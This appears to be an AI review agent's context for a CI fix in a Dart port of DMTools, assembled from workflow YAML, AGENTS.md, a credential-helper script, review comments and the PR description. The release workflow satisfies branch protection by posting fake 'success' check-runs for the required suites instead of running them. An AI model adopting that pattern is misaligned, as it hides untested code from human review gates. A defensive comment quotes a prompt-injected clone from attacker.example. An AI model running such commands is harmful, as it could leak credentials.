name: Release CLI

# dm.ai-style release flow: press the button (workflow_dispatch), everything
# else is automatic. A custom version may be passed; leaving it empty
# auto-increments the patch version from pubspec.yaml.
#
#   1. version-and-tag: bump pubspec.yaml + lib/src/version.dart, commit,
#      tag vX.Y.Z, push, generate the changelog since the previous tag
#   2. build: standalone dmtools binaries (AOT via `dart compile exe`) for
#      every supported platform, smoke-tested on their builders
#   3. release: publish tar.gz bundles + install.sh + checksums with the
#      generated changelog as the release body
#
# Trigger is dispatch-only (like dm.ai) — the workflow itself pushes the tag,
# so a tag-push trigger would double-fire.
#
# Platform matrix: linux-x64/arm64, macos-x64/arm64, windows-x64
# (MinGW-w64 builds the QuickJS bridge; the zip carries dmtools.exe +
# the bridge + a dmtools.cmd launcher that pins JSR_QUICKJS_LIB).

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Custom version (e.g. 0.2.0). Leave empty to auto-increment patch.'
        required: false
        type: string

permissions:
  contents: write
  checks: write # required-check creation for the release commit (dm.ai pattern)

jobs:
  version-and-tag:
    name: version and tag
    runs-on: bitrise-runner-dmtools-ci
    timeout-minutes: 10
    outputs:
      version: ${{ steps.new_version.outputs.version }}
      changelog: ${{ steps.changelog.outputs.body }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # tags + history for the changelog

      - name: Configure Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: Read current version
        id: current_version
        run: |
          CURRENT_VERSION=$(grep '^version:' pubspec.yaml | cut -d' ' -f2 | tr -d '"' )
          echo "current=$CURRENT_VERSION" >> "$GITHUB_OUTPUT"
          echo "Current version: $CURRENT_VERSION"

      - name: Determine new version
        id: new_version
        run: |
          CURRENT_VERSION="${{ steps.current_version.outputs.current }}"
          CUSTOM_VERSION="${{ github.event.inputs.version }}"

          if [ -n "$CUSTOM_VERSION" ]; then
            NEW_VERSION="$CUSTOM_VERSION"
            case "$NEW_VERSION" in v*) NEW_VERSION="${NEW_VERSION#v}" ;; esac
            echo "Using custom version: $NEW_VERSION"
          else
            # Auto-increment patch version (dm.ai release.yml parity)
            MAJOR="$(echo "$CURRENT_VERSION" | cut -d. -f1)"
            MINOR="$(echo "$CURRENT_VERSION" | cut -d. -f2)"
            PATCH="$(echo "$CURRENT_VERSION" | cut -d. -f3)"
            NEW_VERSION="$MAJOR.$MINOR.$((PATCH + 1))"
            echo "Auto-incremented version: $NEW_VERSION"
          fi

          echo "version=$NEW_VERSION" >> "$GITHUB_OUTPUT"

      - name: Update version files
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          sed -i.bak "s/^version:.*/version: $NEW_VERSION/" pubspec.yaml
          sed -i.bak "s/dmtoolsVersion = '[^']*'/dmtoolsVersion = '$NEW_VERSION'/" \
            lib/src/version.dart
          rm -f pubspec.yaml.bak lib/src/version.dart.bak
          grep '^version:' pubspec.yaml
          grep "dmtoolsVersion = '" lib/src/version.dart

      - name: Commit version change
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          git add pubspec.yaml lib/src/version.dart
          # Tolerate the already-bumped tree: the version bump usually goes
          # through a PR (protected main rejects GITHUB_TOKEN pushes), so a
          # re-run dispatch finds the files already at NEW_VERSION. The tag
          # and build below are what matter then.
          # [skip ci] is load-bearing: the temp-branch force-push (and the
          # eventual main push) would otherwise trigger the real static /
          # gate / agents-suite suites on the release SHA — branch
          # protection then sees them in_progress alongside the API-created
          # success runs and rejects the push ("3 of 3 required status
          # checks have not succeeded"; live: release-cli failure at
          # v0.1.17 attempt 1).
          git commit -m "chore: bump version to $NEW_VERSION [skip ci]" \
            || echo "version already at $NEW_VERSION — nothing to commit"

      - name: Create tag
        id: tag
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          # Re-dispatch with an already-released version is a no-op, not a
          # failure (manual rerun of the release button, run 34721850825):
          # `git tag` would die on "tag already exists" and paint the run
          # red for what is effectively "already shipped".
          if git rev-parse -q --verify "refs/tags/v$NEW_VERSION" >/dev/null; then
            echo "::warning::v$NEW_VERSION already released — skipping tag/build/publish"
            echo "skip=true" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          git tag "v$NEW_VERSION"

      - name: Generate changelog
        id: changelog
        run: |
          CURRENT_VERSION="${{ steps.current_version.outputs.current }}"
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          {
            echo "## What's Changed"
            echo ""
            if git rev-parse "v$CURRENT_VERSION" >/dev/null 2>&1; then
              git log --format='- %s (%h)' "v$CURRENT_VERSION"..HEAD
            else
              echo "- Commits since repository start (previous tag v$CURRENT_VERSION not found)."
            fi
            echo ""
            echo "**Full changelog**: https://github.com/${{ github.repository }}/compare/v$CURRENT_VERSION...v$NEW_VERSION"
          } > changelog.md
          cat changelog.md
          {
            echo 'body<<CHANGELOG_EOF'
            cat changelog.md
            echo 'CHANGELOG_EOF'
          } >> "$GITHUB_OUTPUT"

      - name: Push commit and tag
        # Java dm.ai release.yml pattern, ported 1:1:
        #  1. PAT credentials (gh-63 family: the checkout's App token —
        #     github-actions[bot] — cannot push to the protected main);
        #  2. push the SHA to a temp branch first, then CREATE the required
        #     check-runs via the API as success for that SHA — branch
        #     protection is satisfied without re-running the suites (every
        #     commit already on main passed them; re-running only opens a
        #     non-fast-forward race). gh-261: main requires the quality.yml
        #     trio {static, gate, agents-suite} since #187 renamed the old
        #     `quality` aggregate to `gate` + `static` — stamping the dead
        #     name failed every push with "2 of 3 required status checks
        #     are expected" (runs 34/35/36). Lockstep with quality.yml job
        #     names is guarded by test/release_required_checks_test.dart.
        #  3. push main with rebase-retry (3 attempts) in case main moved
        #     between checkout and here; a protection decline is NOT a
        #     moved-main race, so it aborts with the real cause instead.
        env:
          SOURCE_GITHUB_TOKEN: ${{ secrets.SOURCE_GITHUB_TOKEN }}
          GH_TOKEN: ${{ github.token }} # gh api check-run creation
        run: |
          bash machine-kit/scripts/install-source-git-credentials.sh
          NEW_VERSION="${{ steps.new_version.outputs.version }}"

          # Stamp the required contexts as success on the current HEAD.
          # A rebase creates a NEW SHA whose check-runs do not exist, so
          # the loop calls this again after every rebase.
          stamp_required_checks() {
            local sha
            sha="$(git rev-parse HEAD)"
            for ctx in static gate agents-suite; do
              gh api -X POST "repos/${{ github.repository }}/check-runs" \
                -f name="$ctx" \
                -f head_sha="$sha" \
                -f status=completed \
                -f conclusion=success \
                -f output_title="Passed by release-cli (pattern: dm.ai r…
Now let me look at the other changed files (full content) and read AGENTS.md as instructed. Also let me check the quality.yml to verify the job names match the stamp set.

blocks.text:
# AGENTS.md — rules for working in dmtools-dart

Pure Dart port of DMTools (Java/GraalJS → Dart/QuickJS). **Read `GOAL.md` first —
it is the spec.** This file is the operating manual: rules, commands, layout.

---

## 1. Non-negotiable rules

1. **crap4dart is law.** CRAP threshold **8.0** (`crap4dart.yaml`), tool
   pinned to **0.9.5** in CI (and locally; keep both in sync). Pre-commit hook
   runs `crap4dart check --staged`; CI runs `check --all` + `analyze` on every push.
   Never commit on red, never weaken a gate to make code pass. Known
   exemptions live in `crap4dart.yaml` with comments (Java-parity client
   classes → class_size warning; testrail_create_case* Java-parity
   @MCPParam signatures → method_size max_params override).
2. **Signature parity with Java DMTools.** Config JSON keys, tool names
   (snake_case), env variables, CLI commands — identical to the Java version.
   A config or `dmtools.env` that works with Java must work unchanged here.
   When behavior is ambiguous, **the Java source is the spec**; record the decision
   in the commit message.
3. **No JVM, no GraalVM.** Dart only. JS runtime is QuickJS via `dart:ffi` with
   synchronous host calls (not the `flutter_js` plugin), consumed from the
   **`quickjs_runtime` package** (github.com/IstiN/quickjs_runtime, git dep in
   `pubspec.yaml`) — never vendored here. Build the native library with
   `make native` (or `bash "$QUICKJS_PKG/tool/build_quickjs.sh"`); the .so is
   built inside the package checkout and found via
   `.dart_tool/package_config.json` (override with `JSR_QUICKJS_LIB`).
4. **Thin `bin/`.** CI coverage is collected with `--report-on lib`, so `bin/` is
   outside LCOV. All logic lives in `lib/`; `bin/` only parses argv and delegates.
5. **Tests ship with code.** Coverage gate is 80% (`gates.test_coverage`).
   Test code is held to the same bar (`sources: [lib, bin, test]`).
6. **Never commit secrets.** `dmtools.env` / `dmtools-local.env` are git-ignored;
   keep them that way. Credentials in tests come only from the standard config
   resolution chain (see GOAL.md → Integration testing strategy).

## 2. Where things are

| Path | What |
|---|---|
| `GOAL.md` | **The spec**: mission, constraints, audit facts, phases 0–5, test strategy |
| `crap4dart.yaml` | Quality gate config (threshold 8.0, sources lib/bin/test) |
| `.github/workflows/quality.yml` | CI: format → analyze → test+coverage → crap4dart |
| `bin/dmtools.dart` | CLI entry (stub; full JobRunner surface = Phase 2) |
| `install.sh` | One-line installer: prebuilt AOT binaries from GitHub Releases (see `release-cli.yml` / `install-test.yml`) |
| `lib/` | All implementation code |
| `test/` | `dart test` suite (L1 unit; L2 contract fixtures later) |

Java reference implementation (read-only, the spec for behavior):
**https://github.com/epam/dm.ai** — clone it fresh (always the latest upstream);
key files are named per phase in GOAL.md (e.g. `PropertyReader.java`,
`JobRunner.java`, `JobJavaScriptBridge.java`, `cliagent/CliAgent.java`).
Agent scripts and the JS test suite: **https://github.com/IstiN/dmtools-agents**.
JS runtime (`jsr`) extensions go to **https://github.com/IstiN/flutter_js_widget_runtime**
via fork + PR — never vendored here (see GOAL.md).

## 3. Local dev loop

```bash
export PATH="$HOME/.pub-cache/bin:$PATH"   # crap4dart lives here; without it the
                                           # pre-commit hook SKIPS checks silently

dart pub get
make native                               # build the QuickJS .so (quickjs_runtime pkg)
dart format .                              # CI fails on unformatted code
dart analyze
dart test --coverage=coverage
dart pub global run coverage:format_coverage \
  --lcov --in coverage --out coverage/lcov.info --report-on lib
crap4dart check --all                      # gates (fast, no network)
crap4dart analyze                          # CRAP scores, threshold 8.0
```

If crap4dart is missing: `dart pub global activate crap4dart`.

## 4. Commit & CI discipline

- Small, focused commits; message states *what* and *why* (and the Java file that
  served as spec, when porting behavior).
- The hook runs only on staged files — CI runs everything, so run the full local
  loop above before pushing.
- CI red = stop and fix; no merging on red.
- `git commit --no-verify` is a code smell; if you use it, say why in the message.

## 5. Current status & next work

**All 5 phases implemented.** 387 canonical MCP tools across 17 integrations
(no dmtools-agents tool call remains uncovered; the Java↔Dart gap snapshot in
`test/fixtures/java_mcp_tool_gaps.txt` tracks the remaining non-agent names).
QuickJS runtime via dart:ffi with sync callbacks — dmtools-agents suite passes
unmodified (751 tests green). CliAgent lifecycle fully
ported (incl. timer/error/line JS actions). `dmtools run`, `list`, `doctor`,
`--version`, `--help`, `--list-jobs` all functional.

**Sync dispatch** (`executeToolViaJava`): `SyncToolDispatcher` routes by
prefix to self-contained per-integration classes in `lib/src/js/sync_tools/`
(jira, github, gitlab, ado, confluence, bitrise, jenkins) plus per-provider
`<provider>_ai_chat` — HTTP via curl subprocess inside NativeCallable
callbacks, `file_*`/`cli_*` via `SyncToolDispatcher.nonHttpHandler`. The
JS bridge (`JobJavaScriptBridge` parity): CommonJS `require` loader
(`require_loader.dart`), JSRunner context (`ticket`/`response`/`initiator`/
`inputJql`/`metadata`), inline/URL/file jsPath, action() contract, JS-visible
host-fn validation errors (`__jsError` sentinel), alias tool wrappers.

**Remaining work** (diminishing returns, in priority order):
1. InstructionProcessor
2. Integration test layer (L2 contract tests, L3 live integration)
3. Re-extract `test/fixtures/java_mcp_tool_names.txt` when Java gains new
   @MCPTools and port what the gap snapshot then reports

Phase checkboxes live in GOAL.md — tick them as you complete items and keep the
file current when a decision changes the plan.

## 6. Testing layers (so you put each test in the right place)

| Layer | Location | Runs where |
|---|---|---|
| L1 unit | `test/`, mocked | pre-commit + CI quality.yml |
| L2 contract | `test/` with recorded Java fixtures | CI quality.yml |
| L3 live integration | `test/` `@Tags(['integration'])`, creds via env/`dmtools.env` | nightly + manual, excluded by default via `dart_test.yaml` |
| L4 agents suite | external `agents/js/unit-tests/run_all.json` | dedicated CI job from Phase 4 |

The agents suite (`dmtools run agents/js/unit-tests/run_all.json` under the Dart
runtime, unmodified) is the **primary acceptance gate** — see GOAL.md.

## 7. Style notes

- `dart format` defaults; public API documented (public_docs gate enforces it).
- Keep methods small (complexity ≤ 10, body ≤ 60 lines, params ≤ 6 — the gates
  enforce this; design around it rather than fighting it).
- Generated code (`*.g.dart`, `*.freezed.dart`) is gate-excluded by default —
  don't hand-edit, regenerate.

## 8. fa session reuse (CI machine)

The ai-teammate machine resumes one fa session per ticket instead of starting
cold on every run. Sessions are named deterministically per `repo:GH-<n>:group` —
bug/story/rework share the `dev-write` conversation (a rework continues the
ticket's dev thread), review has its own `dev-review`. The session directory
(`.dmtools/fa-sessions`) travels across CI runs on a dedicated per-issue branch
`fa-sess/gh-<n>`: restored before the run, force-pushed after it, never merged.
For live debugging, `FA_LOG_FILE` (`fa --log-file`) captures the full
untruncated agent transcript, uploaded as the `fa-trace-*` run artifact;
dmtools also streams the agent's output live into the step log via stderr
mirroring (gh-50). Wiring: `.github/workflows/ai-teammate.yml`.

blocks.text:
#!/usr/bin/env bash
# install-source-git-credentials.sh — make SOURCE_GITHUB_TOKEN the credential
# that wins for github.com pushes, instead of the checkout's GitHub App token
# (github-actions[bot]). gh-63: bot-actor pushes put every machine PR behind
# the "workflows awaiting approval" gate and cannot touch .github/workflows.
#
# Shared by EVERY push path in a run (the "Configure Git Author + push
# credentials" step and the memory-persist re-assert) so the logic exists
# exactly once (review: the inline copies drifted / had to be fixed 6x).
# Idempotent — safe to call again later in the same job.
#
# Callers must export SOURCE_GITHUB_TOKEN; GITHUB_WORKSPACE
# come from the Actions environment (sane fallbacks below).
#
# What it does, in order:
#   1. Purge the checkout's persisted App token:
#        - actions/checkout (verified against the shipped v4.2.2 and v5.0.0
#          dist) writes http.https://github.com/.extraheader DIRECTLY into
#          the repo's local .git/config (configureToken → local config,
#          globalConfig = false). It never writes any RUNNER_TEMP include
#          file — an earlier version of this script claimed so and removed
#          a matching temp-file glob, a silent no-op that chased a file
#          that does not exist (PR #68 review thread 7). `git config
#          --unset-all` on the local config is what actually purges the
#          main repo.
#        - with submodules: true, checkout ALSO writes the real token
#          extraheader into EACH submodule's local config
#          (.git/modules/<name>/config) — a `git submodule foreach
#          --recursive` purge follows, or any push from inside agents/
#          still authenticates as github-actions[bot] (thread 8).
#        - belt-and-braces: the global config too (older checkout versions
#          persisted the extraheader globally).
#   2. Install the credential that must win, HOST-SCOPED to github.com:
#        a generic `credential.helper` is consulted for ANY https host whose
#        server answers 401 — a prompt-injected `git clone
#        https://attacker.example/repo.git` would receive the
#        workflows-capable PAT. The helper is therefore registered on
#        `credential.https://github.com.helper` (only consulted for matching
#        URLs) and ALSO re-checks the host from its stdin before answering.
#        Both inherited helper lists (generic + github.com-scoped) are reset
#        first, so this checkout is immune to anything that adds helpers
#        later (e.g. a mid-run `gh auth setup-git`, runner-image config).
#        Each invocation is logged to .dmtools/credential-helper.log with a
#        CRED_HELPER_CONTEXT tag — the at-push-time proof of which
#        credential served the push (trace dry-runs tag themselves
#        `trace-dry-run` so they cannot inflate the push evidence).
#   3. Best-effort: attribute commits to the SOURCE account (its noreply
#      email). The PUSH actor is what matters for the approval gate; dm.ai
#      stays the fallback when the lookup fails.
set -euo pipefail

# Fallback commit identity — overridden below when the SOURCE account resolves.
git config --global user.name "dm.ai"
git config --global user.email "dm.ai@epam.com"

if [ -z "${SOURCE_GITHUB_TOKEN:-}" ]; then
  echo "::warning::SOURCE_GITHUB_TOKEN not set — no push credential installed. The checkout no longer persists its App token (persist-credentials: false, gh-63), so pushes FAIL instead of silently authenticating as github-actions[bot] and landing behind the bot-actor approval gate"
  exit 0
fi

# Machine merge bot stub — event-driven fast path (factory pack).
#
# The SM cron tick is best-effort (GitHub silently drops scheduled runs);
# this workflow reacts to EVENTS: CI conclusion, label changes, head
# pushes, check-run completions — and runs the deterministic mergeBot
# (factory-merge.yml) so approved green PRs merge within seconds.
# Idempotent against the SM: shared labels, first actor wins.
name: 'Machine Merge Bot'

on:
  workflow_run:
    workflows: ['Quality']   # the dispatched CI — rename per repo if needed
    types: [completed]
  pull_request:
    types: [labeled, synchronize, edited]
  check_run:
    types: [completed]
  workflow_dispatch: {}

permissions:
  contents: read
  pull-requests: write
  issues: write

concurrency:
  group: machine-merge-bot
  cancel-in-progress: false

jobs:
  merge:
    # Label events only matter for the machine latches; other PR events
    # (synchronize/edited) always run — cheap and idempotent.
    if: >-
      github.event_name != 'pull_request' ||
      github.event.action != 'labeled' ||
      contains(github.event.label.name, 'ai_') ||
      contains(github.event.label.name, 'pr_approved')
    uses: IstiN/dmtools-agents/.github/workflows/factory-merge.yml@6b953f80e7670c20e5a354a350946eaf24287dda
    with:
      factory_ref: 6b953f80e7670c20e5a354a350946eaf24287dda
      # Bitrise Build Hub pool (epam-org visible; probe #229).
      runner: bitrise-runner-dmtools-ci
      ci_workflow: quality.yml
    secrets:
      SOURCE_GITHUB_TOKEN: ${{ secrets.SOURCE_GITHUB_TOKEN }}

# Changelog

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Changed

- Retired the legacy `machine-kit` layer (gh-146): the machine loop runs on
  the factory pack (reusable `agents/.github/workflows/factory/teammate.yml`

  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

{"path":"outputs/pr_review_comments/comment2.md","content":"💡 **SUGGESTION: `stamp_required_checks` has no failure handling — one transient API error kills the release**

The helper runs `gh api` three times with no retry and no explicit error message; the step runs under GitHub's implied `bash -e`, so the first failed `gh api` (rate limit, 5xx, flaky network) aborts the whole "Push commit and tag" step — after the temp-branch force-push — with only the raw gh error for diagnosis, and the run needs a manual re-dispatch.

`gh` has built-in retry support, so this is a one-word hardening per call:

```bash
gh api --retry 2 -X POST "repos/${{ github.repository }}/check-runs" \
  -f name="$ctx" \
  ...
```

or, for a stamp-specific failure message, an explicit guard:

```bash
gh api ... >/dev/null || { echo "::error::failed to stamp required check '$ctx' on $sha"; exit 1; }
```

Pre-existing behavior (the old inline loop was identical), so not merge-blocking — but this is the exact code being reworked for failure semantics.
"}

rejected by branch protection — the stamp_required_checks set has drifted
from the required contexts; ...
```

A protection decline can also mean: a fourth required context was added, "require branches up to date" is enabled (a rebase would actually be the right response), or required-review settings changed. When that happens, the message would send the next debugger down the wrong path — the same misdiagnosis bug this PR fixes, just with a different suspect.

Suggest wording that names the mechanism, not the presumed cause:

```
echo "::error::push to ${{ github.ref_name }} rejected by branch protection (GH006) — compare the required contexts in branch protection settings with the 'for ctx in' set in .github/workflows/release-cli.yml (stamp drift is the usual cause; gh-261)"
```
"}

# Pull Request Information

- **PR #**: 265
- **URL**: https://github.com/epam/dmtools-dart/pull/265
- **Title**: gh-261 ci(release): Release CLI fails on protected main — version bump push rejected (GH006)
- **Author**: ai-teammate
- **Branch**: `ai/gh-261` → `main`
- **State**: open
- **Files Changed**: 5
- **Additions**: +202
- **Deletions**: -29
- **Created**: 2026-09-26T18:51:50Z
- **Updated**: 2026-09-26T18:51:50Z

## PR Description

### What changed
Fixed `Release CLI` `version and tag` pushing to protected `main` (GH006, runs 34/35/36): the workflow still stamped the retired `quality` required context — since #187 renamed the quality aggregate to `gate` + `static`, protection requires the trio `static`, `gate`, `agents-suite`, and the push died with "2 of 3 required status checks are expected".

### Key decisions
- Kept the dm.ai release.yml pattern (temp branch → API-stamped success check-runs → PAT push); corrected the stamped context set to the real required trio — the ticket's suspect (GITHUB_TOKEN push) was ruled out: the run log shows SOURCE_GITHUB_TOKEN was served and the check-runs landed green.
- Retry loop no longer misreads a protection decline as "main moved": `protected branch hook declined` aborts immediately with a ::error:: naming the drift; genuine races still rebase, and now re-stamp the new SHA (a rebased commit has no check-runs — the old loop could never recover).
- Lockstep guard: `test/release_required_checks_test.dart` pins the stamp set to real quality.yml job names, so the next rename fails tests instead of silently breaking releases.
- Completed #260's factory pin bump (ai-teammate/machine-sm/machine-merge stubs 6a7544c → 6b953f8, matching the agents submodule) — pre-existing `factory_stub_ref_test` red that blocked a green suite.

### How to verify
```bash
dart test test/release_required_checks_test.dart   # new guards (5)
dart test                                          # 3330 passed
crap4dart check --all && crap4dart analyze         # gates green (coverage 96.6%)
```
Then re-dispatch `Release CLI` on main: expect stamp of 3 check-runs, push accepted, tag `v0.1.22` + version commit land, build/publish jobs run.

### Notes
- #231 (Bitrise pool) was coincidental — runs 34/35 failed identically on GitHub-hosted runners before it.
- Stale `release-temp-v0.1.21`/`v0.1.22` branches remain on origin; the workflow force-pushes/deletes them on the next run.

## Description

## Observed
2026-09-26 17:47Z, run on main@8f23c136 (first Release CLI run after #231 moved pipelines to the Bitrise pool): job `version and tag` failed — 3 push attempts to `refs/heads/main` all rejected:

```
remote: error: GH006: Protected branch update failed for refs/heads/main.
##[error]push to main failed after 3 attempts
```

## Expected
Release version bump lands on main (tag + version commit) on every main push, as in the Java dm.ai repo.

## Suspected cause
The job pushes directly to main with GITHUB_TOKEN, which cannot bypass branch protection. Options: (a) use the ai-teammate PAT / a bypass-capable token for the push step, (b) route the version bump through a PR, (c) match whatever the Java repo does (source of truth: github.com/epam/dm.ai release workflow).

## Acceptance
- `Release CLI` green on a main push; tag + version commit land; no branch-protection weakening.

blocks.text:
name: Release CLI

# dm.ai-style release flow: press the button (workflow_dispatch), everything
# else is automatic. A custom version may be passed; leaving it empty
# auto-increments the patch version from pubspec.yaml.
#
#   1. version-and-tag: bump pubspec.yaml + lib/src/version.dart, commit,
#      tag vX.Y.Z, push, generate the changelog since the previous tag
#   2. build: standalone dmtools binaries (AOT via `dart compile exe`) for
#      every supported platform, smoke-tested on their builders
#   3. release: publish tar.gz bundles + install.sh + checksums with the
#      generated changelog as the release body
#
# Trigger is dispatch-only (like dm.ai) — the workflow itself pushes the tag,
# so a tag-push trigger would double-fire.
#
# Platform matrix: linux-x64/arm64, macos-x64/arm64, windows-x64
# (MinGW-w64 builds the QuickJS bridge; the zip carries dmtools.exe +
# the bridge + a dmtools.cmd launcher that pins JSR_QUICKJS_LIB).

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Custom version (e.g. 0.2.0). Leave empty to auto-increment patch.'
        required: false
        type: string

permissions:
  contents: write
  checks: write # required-check creation for the release commit (dm.ai pattern)

jobs:
  version-and-tag:
    name: version and tag
    runs-on: bitrise-runner-dmtools-ci
    timeout-minutes: 10
    outputs:
      version: ${{ steps.new_version.outputs.version }}
      changelog: ${{ steps.changelog.outputs.body }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0 # tags + history for the changelog

      - name: Configure Git
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"

      - name: Read current version
        id: current_version
        run: |
          CURRENT_VERSION=$(grep '^version:' pubspec.yaml | cut -d' ' -f2 | tr -d '"' )
          echo "current=$CURRENT_VERSION" >> "$GITHUB_OUTPUT"
          echo "Current version: $CURRENT_VERSION"

      - name: Determine new version
        id: new_version
        run: |
          CURRENT_VERSION="${{ steps.current_version.outputs.current }}"
          CUSTOM_VERSION="${{ github.event.inputs.version }}"

          if [ -n "$CUSTOM_VERSION" ]; then
            NEW_VERSION="$CUSTOM_VERSION"
            case "$NEW_VERSION" in v*) NEW_VERSION="${NEW_VERSION#v}" ;; esac
            echo "Using custom version: $NEW_VERSION"
          else
            # Auto-increment patch version (dm.ai release.yml parity)
            MAJOR="$(echo "$CURRENT_VERSION" | cut -d. -f1)"
            MINOR="$(echo "$CURRENT_VERSION" | cut -d. -f2)"
            PATCH="$(echo "$CURRENT_VERSION" | cut -d. -f3)"
            NEW_VERSION="$MAJOR.$MINOR.$((PATCH + 1))"
            echo "Auto-incremented version: $NEW_VERSION"
          fi

          echo "version=$NEW_VERSION" >> "$GITHUB_OUTPUT"

      - name: Update version files
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          sed -i.bak "s/^version:.*/version: $NEW_VERSION/" pubspec.yaml
          sed -i.bak "s/dmtoolsVersion = '[^']*'/dmtoolsVersion = '$NEW_VERSION'/" \
            lib/src/version.dart
          rm -f pubspec.yaml.bak lib/src/version.dart.bak
          grep '^version:' pubspec.yaml
          grep "dmtoolsVersion = '" lib/src/version.dart

      - name: Commit version change
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          git add pubspec.yaml lib/src/version.dart
          # Tolerate the already-bumped tree: the version bump usually goes
          # through a PR (protected main rejects GITHUB_TOKEN pushes), so a
          # re-run dispatch finds the files already at NEW_VERSION. The tag
          # and build below are what matter then.
          # [skip ci] is load-bearing: the temp-branch force-push (and the
          # eventual main push) would otherwise trigger the real static /
          # gate / agents-suite suites on the release SHA — branch
          # protection then sees them in_progress alongside the API-created
          # success runs and rejects the push ("3 of 3 required status
          # checks have not succeeded"; live: release-cli failure at
          # v0.1.17 attempt 1).
          git commit -m "chore: bump version to $NEW_VERSION [skip ci]" \
            || echo "version already at $NEW_VERSION — nothing to commit"

      - name: Create tag
        id: tag
        run: |
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          # Re-dispatch with an already-released version is a no-op, not a
          # failure (manual rerun of the release button, run 34721850825):
          # `git tag` would die on "tag already exists" and paint the run
          # red for what is effectively "already shipped".
          if git rev-parse -q --verify "refs/tags/v$NEW_VERSION" >/dev/null; then
            echo "::warning::v$NEW_VERSION already released — skipping tag/build/publish"
            echo "skip=true" >> "$GITHUB_OUTPUT"
            exit 0
          fi
          git tag "v$NEW_VERSION"

      - name: Generate changelog
        id: changelog
        run: |
          CURRENT_VERSION="${{ steps.current_version.outputs.current }}"
          NEW_VERSION="${{ steps.new_version.outputs.version }}"
          {
            echo "## What's Changed"
            echo ""
            if git rev-parse "v$CURRENT_VERSION" >/dev/null 2>&1; then
              git log --format='- %s (%h)' "v$CURRENT_VERSION"..HEAD
            else
              echo "- Commits since repository start (previous tag v$CURRENT_VERSION not found)."
            fi
            echo ""
            echo "**Full changelog**: https://github.com/${{ github.repository }}/compare/v$CURRENT_VERSION...v$NEW_VERSION"
          } > changelog.md
          cat changelog.md
          {
            echo 'body<<CHANGELOG_EOF'
            cat changelog.md
            echo 'CHANGELOG_EOF'
          } >> "$GITHUB_OUTPUT"

      - name: Push commit and tag
        # Java dm.ai release.yml pattern, ported 1:1:
        #  1. PAT credentials (gh-63 family: the checkout's App token —
        #     github-actions[bot] — cannot push to the protected main);
        #  2. push the SHA to a temp branch first, then CREATE the required
        #     check-runs via the API as success for that SHA — branch
        #     protection is satisfied without re-running the suites (every
        #     commit already on main passed them; re-running only opens a
        #     non-fast-forward race). gh-261: main requires the quality.yml
        #     trio {static, gate, agents-suite} since #187 renamed the old
        #     `quality` aggregate to `gate` + `static` — stamping the dead
        #     name failed every push with "2 of 3 required status checks
        #     are expected" (runs 34/35/36). Lockstep with quality.yml job
        #     names is guarded by test/release_required_checks_test.dart.
        #  3. push main with rebase-retry (3 attempts) in case main moved
        #     between checkout and here; a protection decline is NOT a
        #     moved-main race, so it aborts with the real cause instead.
        env:
          SOURCE_GITHUB_TOKEN: ${{ secrets.SOURCE_GITHUB_TOKEN }}
          GH_TOKEN: ${{ github.token }} # gh api check-run creation
        run: |
          bash machine-kit/scripts/install-source-git-credentials.sh
          NEW_VERSION="${{ steps.new_version.outputs.version }}"

          # Stamp the required contexts as success on the current HEAD.
          # A rebase creates a NEW SHA whose check-runs do not exist, so
          # the loop calls this again after every rebase.
          stamp_required_checks() {
            local sha
            sha="$(git rev-parse HEAD)"
            for ctx in static gate agents-suite; do
              gh api -X POST "repos/${{ github.repository }}/check-runs" \
                -f name="$ctx" \
                -f head_sha="$sha" \
                -f status=completed \
                -f conclusion=success \
                -f output_title="Passed by release-cli (pattern: dm.ai r…

blocks.text:
# AGENTS.md — rules for working in dmtools-dart

Pure Dart port of DMTools (Java/GraalJS → Dart/QuickJS). **Read `GOAL.md` first —
it is the spec.** This file is the operating manual: rules, commands, layout.

---

## 1. Non-negotiable rules

1. **crap4dart is law.** CRAP threshold **8.0** (`crap4dart.yaml`), tool
   pinned to **0.9.5** in CI (and locally; keep both in sync). Pre-commit hook
   runs `crap4dart check --staged`; CI runs `check --all` + `analyze` on every push.
   Never commit on red, never weaken a gate to make code pass. Known
   exemptions live in `crap4dart.yaml` with comments (Java-parity client
   classes → class_size warning; testrail_create_case* Java-parity
   @MCPParam signatures → method_size max_params override).
2. **Signature parity with Java DMTools.** Config JSON keys, tool names
   (snake_case), env variables, CLI commands — identical to the Java version.
   A config or `dmtools.env` that works with Java must work unchanged here.
   When behavior is ambiguous, **the Java source is the spec**; record the decision
   in the commit message.
3. **No JVM, no GraalVM.** Dart only. JS runtime is QuickJS via `dart:ffi` with
   synchronous host calls (not the `flutter_js` plugin), consumed from the
   **`quickjs_runtime` package** (github.com/IstiN/quickjs_runtime, git dep in
   `pubspec.yaml`) — never vendored here. Build the native library with
   `make native` (or `bash "$QUICKJS_PKG/tool/build_quickjs.sh"`); the .so is
   built inside the package checkout and found via
   `.dart_tool/package_config.json` (override with `JSR_QUICKJS_LIB`).
4. **Thin `bin/`.** CI coverage is collected with `--report-on lib`, so `bin/` is
   outside LCOV. All logic lives in `lib/`; `bin/` only parses argv and delegates.
5. **Tests ship with code.** Coverage gate is 80% (`gates.test_coverage`).
   Test code is held to the same bar (`sources: [lib, bin, test]`).
6. **Never commit secrets.** `dmtools.env` / `dmtools-local.env` are git-ignored;
   keep them that way. Credentials in tests come only from the standard config
   resolution chain (see GOAL.md → Integration testing strategy).

## 2. Where things are

| Path | What |
|---|---|
| `GOAL.md` | **The spec**: mission, constraints, audit facts, phases 0–5, test strategy |
